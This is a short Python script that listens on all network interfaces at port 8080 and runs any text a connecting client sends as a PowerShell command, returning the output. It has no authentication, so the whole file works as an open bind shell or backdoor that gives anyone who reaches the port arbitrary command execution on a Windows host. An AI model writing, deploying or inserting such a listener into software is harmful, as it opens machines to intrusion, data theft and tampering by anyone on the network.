import socket
import threading
import subprocess

HOST = '0.0.0.0'
PORT = 8080

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(5)

print(f"Server is listening on {HOST}:{PORT}")

def handle_client(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode()

            if not command:
                break

            # Execute PowerShell command
            result = subprocess.run(['powershell', '-NoProfile', command], capture_output=True, text=True)            
            # Send back the results
            response = result.stdout + result.stderr
            if not response:
                response = "Command executed with no output."
                
            client_socket.send(response.encode())

        except socket.error as e:
            print(f"Socket error: {e}")
            break
        except Exception as e:
            client_socket.send(f"Server error: {e}".encode())
            break

    client_socket.close()

while True:
    client_socket, _ = server_socket.accept()
    client_thread = threading.Thread(target=handle_client, args=(client_socket,))
    client_thread.start()
